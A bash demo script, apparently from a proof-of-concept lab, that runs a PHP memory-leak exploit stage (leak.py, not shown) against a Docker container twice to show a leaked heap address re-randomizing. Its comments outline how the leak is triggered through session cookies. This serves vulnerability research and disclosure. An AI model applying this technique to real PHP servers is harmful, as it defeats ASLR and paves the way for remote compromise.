#!/usr/bin/env bash
#
# demo_aslr.sh: php2leak remote ASLR leak (PHP2Shell CVE-2026-109618/109619
# chain, ASLR-leak stage), run twice with a container restart between runs to
# show the leaked Zend MM chunk base re-randomizes. Each run also fetches
# debug.php (/proc/self/maps) for ground-truth verification.
#
# Zero userland code required: target/index.php is just `<?php echo "ok\n";`.
# Request 1 arms PS(id) + PS(send_cookie)=1 across a pre-RINIT OOM bailout;
# Request 2 leaks 262 bytes of reclaimed heap memory in Set-Cookie: PHPSESSID=.

set -eo pipefail

STRIP_ANSI=$'s/\033\\[[0-9;]*m//g'

if docker compose version >/dev/null 2>&1; then
  COMPOSE=(docker compose)
else
  COMPOSE=(docker-compose)
fi

wait_ready() {
  for _ in $(seq 1 30); do
    if docker exec php2leak-target \
        curl -s -f -o /dev/null http://localhost/debug.php 2>/dev/null; then
      return 0
    fi
    sleep 0.5
  done
  echo "Error: timed out waiting for php2leak-target" >&2
  return 1
}

run() {
  docker restart php2leak-target >/dev/null 2>&1
  wait_ready

  echo "  [leak]"
  "${COMPOSE[@]}" run --rm -T -e TERM=dumb -e PWNLIB_NOTERM=1 attacker \
    python3 /exploit/leak.py target 80 2>&1 \
    | sed "$STRIP_ANSI" | grep -E "Set-Cookie leaked|heap ptr|chunk base" | sed 's/^/    /'

  echo "  [ground truth] debug.php"
  docker exec php2leak-target curl -s http://localhost/debug.php \
    | grep -E "zend_alloc|libphp" | awk '{print "    " $1 "  " $NF}'
}

echo "== run 1 =="; run
echo "== run 2 (restart -> ASLR) =="; run
